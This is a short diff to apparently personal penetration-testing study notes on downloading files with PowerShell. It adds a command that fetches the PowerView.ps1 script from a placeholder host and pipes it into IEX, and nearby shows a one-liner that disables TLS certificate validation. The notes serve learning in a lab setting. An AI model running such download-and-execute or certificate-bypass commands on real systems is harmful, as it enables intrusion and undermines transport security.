@@ -116,9 +116,12 @@ There may be cases when the Internet Explorer first-launch configuration has not
 ![](../../Attachements/Pasted%20image%2020260726124016.png)
 This can be bypassed using the parameter `-UseBasicParsing`.
 ![](../../Attachements/Pasted%20image%2020260726124110.png)
+```powershell
+Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
+```
 Another error in PowerShell downloads is related to the SSL/TLS secure channel if the certificate is not trusted. We can bypass that error with the following command:
 
-
+![](../../Attachements/Pasted%20image%2020260726124226.png)
 ```powershell
 PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
 ```
